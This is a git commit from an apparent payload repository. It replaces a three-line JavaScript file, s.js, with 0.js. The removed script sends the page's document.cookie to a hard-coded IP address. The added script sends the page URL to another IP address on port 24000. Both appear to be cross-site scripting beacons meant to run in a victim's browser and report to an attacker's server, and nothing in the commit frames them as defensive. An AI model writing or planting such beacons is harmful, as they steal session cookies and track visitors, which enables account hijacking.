f0d43a7197ee8777dbfd114e9463e62a4f9e3554
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-25 17:10:07 +0100

    Update and rename s.js to 0.js

---
+++ 0.js
@@ -0,0 +1,3 @@
+var xhr=new XMLHttpRequest(); 
+xhr.open("GET", "https://82.65.210.151:24000/?"+document.URL, true); 
+xhr.send();
--- s.js
+++
@@ -1,3 +0,0 @@
-var xhr=new XMLHttpRequest(); 
-xhr.open("GET", "https://162.19.26.37/?"+document.cookie, true); 
-xhr.send();
